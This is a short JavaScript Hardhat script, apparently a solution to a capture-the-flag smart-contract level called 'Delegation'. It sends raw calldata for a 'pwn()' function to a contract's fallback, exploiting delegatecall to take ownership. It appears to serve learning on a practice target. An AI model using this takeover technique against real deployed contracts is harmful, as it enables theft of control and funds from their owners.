const path = require('path');
const addresses = require('../Addresses.json');

async function main() {
    const scriptName = path.basename(__filename, '.js');
    console.log('----------', scriptName, '----------');

    const accounts = await ethers.getSigners();
    const sender = accounts[0];

    const delegationAddress = addresses[scriptName];

    const interface = new ethers.utils.Interface(["function pwn()"]);
    let functionSig = interface.encodeFunctionData('pwn', []); 

    const txFallback = await sender.sendTransaction({to: delegationAddress, data: functionSig, gasLimit: 60000});

    console.log('----------End----------');
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });
  